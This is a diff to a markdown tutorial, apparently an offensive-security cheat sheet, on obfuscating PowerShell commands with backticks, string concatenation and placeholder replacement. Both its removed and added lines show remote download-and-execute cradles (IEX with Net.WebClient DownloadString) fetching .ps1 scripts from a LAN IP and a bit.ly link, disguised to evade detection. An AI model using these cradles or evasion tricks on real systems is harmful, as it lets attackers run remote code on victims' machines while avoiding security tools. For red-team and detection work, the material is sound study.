@@ -389,21 +389,21 @@ The above string can be obfuscated using the **powershell special character: `**
 
 ---
 
-      We can obfuscate syscall's by simple split them into local variables or concaternate them
+      We can obfuscate syscall's by simple split them into local variables and concaternate them
 
 <br />
 
 - String command to obfuscate<br />
-`powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.71/agent.ps1')`<br />
+`powershell.exe Get-WmiObject -Class Win32_ComputerSystem`<br />
 The above string can be obfuscated using **powershell special characters:** **`** and **+** and **$var** and **'**<br />
 
 - String obfuscated<br />
 
-      $get = "N`et.Web`Cli`ent";              <-- caret ` inside double quotes
-      $Dow = 'Do'+'wn'+'loa'+'dStri'+'ng';    <-- caret + inside single quotes
-      powershell.exe IEX (New-Object $get).$Dow('h'+'ttp'+':'+'//'+'192.168'+'.1.71/agent.ps1')
+      $get = "G`et-Wm`iObj`ect"                     #<-- caret ` inside double quotes
+      $Dow = 'Wi'+'n32_C'+'ompu'+'terS'+'ystem'     #<-- caret + inside single quotes
+      p`ow`ers`hell.e`xe $get -Class $Dow
 
-![powershell obfuscation](http://i.cubeupload.com/XvV4bB.jpg)
+![powershell obfuscation](http://i.cubeupload.com/JosaOh.jpg)
 
 ---
       'Powershell also allow us to access windows environment variables using the $env: switch'
@@ -449,11 +449,11 @@ The above string can be obfuscated using **powershell special characters:** **`*
 <br />
 
 - String command to obfuscate<br />
-`(New-Object Net.WebClient).DownloadString('https://bit.ly/L3g1t.ps1')`
+`(New-Object Net.WebClient).DownloadString('http://192.168.1.71/Hello.ps1')`
 
 - String obfuscated<br />
 
-      $encoded= "(New-Object Net.We~~bClient).Downlo~~adString('https://bi~~t.ly/L3g1t.ps1')"
+      $encoded= "(New-Object Net.We~~bClient).Downlo~~adString('h'+'ttp'+'://192.168.1.71/Hello.ps1')"
       $decoded = $encoded.Replace("~~","")
       IEX $decoded
 
@@ -462,7 +462,7 @@ The above string can be obfuscated using **powershell special characters:** **`*
       IEX $decoded
 
 
-![powershell obfuscation](http://i.)
+![powershell obfuscation](http://i.cubeupload.com/1hkDms.jpg)
 
 ---
 
